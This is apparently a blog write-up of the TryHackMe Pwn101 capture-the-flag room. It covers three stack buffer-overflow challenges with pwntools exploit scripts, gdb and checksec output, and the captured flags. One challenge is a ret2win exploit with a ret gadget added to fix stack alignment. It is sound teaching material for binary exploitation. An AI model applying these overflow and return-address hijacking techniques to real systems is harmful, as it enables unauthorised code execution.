---
title: "[THM] Pwn101 Writeup"
cover: >-
    https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/Blog_cover%20(3)-min.jpg
categories:
    - [TryHackMe]
    - [CTF]
tags:
    - Pwn
    - Hacking
    - CTF
abbrlink: 83b7f1b
date: 2024-07-20 13:53:43
---

# Challenge 1 - pwn101

First, we use IDA to decompile the binary it gave us. We can see that the program declare a 60 bytes array for char v4. And the winnning condition is to use v4 to overflow and cover the value of v5, which is 1337 initially. Since it didn't ask us to make v5 to a specific value, we can just make sure it not equal to 1337.

![IDA Decompiled Code](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240720141210657.png)

To do that, I use a Python script to do it.

```python
from pwn import *

r = remote("10.10.153.228", 9001)

r.recvuntil("Type the required ingredients to make briyani:")
r.sendline("A"*61)
r.interactive()
```

![Flag](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240720141712693.png)

```
THM{7h4t's_4n_3zy_oveRflowwwww}
```

# Challenge 2 - pwn102

First step, IDA decompile the binary.

![IDA Decompiled Code](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240720144645154.png)

According to the code, we can know that the char v4 is a 104 bytes array, and the winning condition is to let v5 equals to `0xC0FF330000C0D3`. So we can simply overflow the v4 to cover v5. The exploit is as follow.

```python
from pwn import *

payload = b"A" * 104 + p64(0xC0FF330000C0D3)


r = remote("10.10.153.228", 9002)
r.recvuntil("Am I right?")
r.sendline(payload)
```

By running this script, we can get the shell to cat the flag out.

![Flag](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240720144940194.png)

```
THM{y3s_1_n33D_C0ff33_to_C0d3_<3}
```

# Challenge 3 - pwn103

First, I use `checksec` to check the binary protection.

```bash
┌──(kali㉿kali)-[~/CTF/THM/pwn103]
└─$ pwn checksec pwn
[*] '/home/kali/CTF/THM/pwn103/pwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Next, I use IDA to decompile the binary so that I can check where is the vulnerability easier. If you check the decompiled code throughly, you will find out the vuln is in the `general()` function, which is the 3rd choice in the menu (You can also find the vuln if you run the binary and test each choice on the menu). The code of the `general()` function is as follows.

```c
int general()
{
  const char **v0; // rdx
  char s1[32]; // [rsp+0h] [rbp-20h] BYREF

  puts(asc_4023AA);
  puts(aJopraveenHello);
  puts(aJopraveenHopeY);
  puts(aJopraveenYouFo);
  printf("------[pwner]: ");
  __isoc99_scanf("%s", s1);
  if ( strcmp(s1, "yes") )
    return puts(aTryHarder);
  puts(aJopraveenGg);
  return main((int)aJopraveenGg, (const char **)"yes", v0);
}
```

We can notice that the vuln is at the `scanf()`, which allows us to cover the value of `s1`. Furthermore, I found a suspicious function in gdb.

![GDB](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240725152515328.png)

The `admins_only()` function looks interesting. After checking the decompiled code in IDA, I found that it turns out to be dangerous.

```c
int admins_only()
{
  puts(asc_403267);
  puts(aWelcomeAdmin);
  return system("/bin/sh");
}
```

It open the shell for us! The thing is, how can we access this function? Until now, we can probably know that this is a ret2win problem. We need to cover the return address to gain access to the dangerous function. So I use `cyclic 100` to create the pattern to know the offset of the padding.

![Find the offset by cyclic](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240725153412668.png)

Then by using the `cyclic -l faaaaaaa` to look up the offset value, we get the offset is 40.

```bash
pwndbg> cyclic -l faaaaaaa
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
```

Next step is to find the address of `admins_only()`. Since the binary has no PIE, the address will be always fixed. To get the address, we can simply type in `print &admins_only` in gdb.

```bash
pwndbg> print &admins_only
$1 = (<text variable, no debug info> *) 0x401554 <admins_only>
```

Now, we know that the address of `admins_only()` is `0x401554`, so we can start writing the exploit!

```python
from pwn import *

offset = 40
admin_only_address = 0x401554
padding = b"A" * offset

payload = padding + p64(admin_only_address)

p = remote("10.10.194.195", 9003)
p.sendline(b"3")
p.sendline(payload)
p.interactive()
```

But when we execute the script, it won't give us the shell. After watching this video, I understand that there's a MOVAPS issue.

<div style="position: relative; width: 100%; height: 0; padding-bottom: 56.25%;">
    <iframe style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;" src="https://www.youtube.com/embed/-VUtXwDm5yQ" frameborder="0" allowfullscreen></iframe>
</div>
<br/>

So how do we solve the MOVAPS issue? [This articel](https://ropemporium.com/guide.html) tells us the answer.

> **The MOVAPS issue**
> If you're segfaulting on a `movaps` instruction in `buffered_vfprintf()` or `do_system()` in the x86_64 challenges, then ensure the stack is 16-byte aligned before returning to GLIBC functions such as `printf()` or `system()`. Some versions of GLIBC uses `movaps` instructions to move data onto the stack in certain functions. The 64 bit calling convention requires the stack to be 16-byte aligned before a `call` instruction but this is easily violated during ROP chain execution, causing all further calls from that function to be made with a misaligned stack. `movaps` triggers a general protection fault when operating on unaligned data, so try padding your ROP chain with an extra `ret` before returning into a function or return further into a function to skip a `push` instruction.

Here I use the first method, which is add a ret gadget in my ROP (Return-Oriented Programming) chain. To find the ret gadget, we can type `layout asm` in gdb.

![ret gadget](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240725162429324.png)

Now we can write the exploit with this solution to the MOVAPS issue.

```python
from pwn import *

offset = 40
admin_only_address = 0x401554
padding = b"A" * offset
ret_gadget = 0x4016E0  # Solve the MOVAPS issue

payload = padding + p64(ret_gadget) + p64(admin_only_address)

p = remote("10.10.194.195", 9003)
p.sendline(b"3")
p.sendline(payload)
p.interactive()
```

By running the script, we can get the shell and cat out the flag.txt!

![Pwned!](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240725163326781.png)

```
THM{w3lC0m3_4Dm1N}
```
